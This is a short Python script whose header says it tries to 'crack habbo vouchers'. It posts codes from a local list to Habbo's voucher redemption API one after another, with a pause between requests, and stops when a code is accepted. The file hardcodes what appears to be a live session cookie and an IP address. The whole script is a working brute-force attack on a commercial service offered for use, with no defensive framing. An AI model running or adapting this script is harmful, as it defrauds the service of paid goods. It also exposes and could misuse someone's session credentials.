# voucher.py
# try to crack habbo vouchers
#
# author: ronny macmaster
import requests
import time

# init request values
voucher = ""
url = 'https://www.habbo.com/shopapi/voucher/redeem'
values = {'voucherCode': ''}
headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
           'Referer': "https://www.habbo.com/shop",
           'Host': "www.habbo.com",
           'Cookie': "browser_token=s%3AHHOSYwusPfxbZa84ysTmilNLxyIdcazZJK7CUU2OwQo.ZfAWAKE0dZt7H1BZTAPk8BRyeZQorqE44bXMzDouKGo; __gads=ID=984e105ff0baea98:T=1459580991:S=ALNI_MYkrI9WVbv5qzLGRQYM78k3grXtuQ; YPF8827340282Jdskjhfiw_928937459182JAX666=70.114.219.70; _gat=1; session.id=s%3AUj7yoRrDNXX-QhXg8bmMTSZNxHZsaiRpwf2xCo24doE.mvICTXTzGOcYZlspIfKFCcOkKRMbbflUHJb0NOwZnhI; __utmt=1; __utma=78068493.939098171.1459059353.1460161703.1460221805.12; __utmb=78068493.15.9.1460221869525; __utmc=78068493; __utmz=78068493.1459066175.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.2.939098171.1459059353"
           }

# read voucher file
vhand = open("vouchers")

# send requests
for voucher in vhand:
    values["voucherCode"] = voucher.rstrip()
    r = requests.post(url, data=values, headers=headers)
    resp = r.content
    time.sleep(3)
    # check valid voucher
    if not resp.startswith('{"error":'):
        print resp
        print "voucher = " + voucher
        exit()
    else:
        print resp
